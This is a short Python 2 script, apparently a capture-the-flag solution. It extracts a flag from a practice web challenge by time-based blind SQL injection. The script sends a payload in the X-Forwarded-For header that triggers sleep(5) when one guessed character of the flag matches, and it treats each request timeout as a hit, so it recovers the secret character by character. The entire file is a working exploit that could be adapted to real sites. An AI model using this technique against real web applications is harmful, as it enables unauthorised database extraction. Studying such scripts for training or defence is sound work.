#-*-coding:utf-8-*-
import requests
import string
url="http://ctf5.shiyanbar.com/web/wonderkun/index.php"
guess=r"abcdefghijklmnopqrs tuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@;\/:.,0123456789_"
flag=""

for i in range(1,100):
    havetry=0
    for j in guess:
        headers={"x-forwarded-for":"' +(select case when (substring((select flag from flag ) from %d for 1 )='%s') then sleep(5) else 1 end ) and '1'='1" %(i,j)}
        try: 
            res=requests.get(url,headers=headers,timeout=4)
        except requests.exceptions.ReadTimeout, e:
            havetry=1
            flag = flag + j
            print "flag:", flag
            break
    if havetry==0:
        break
print 'result:' + flag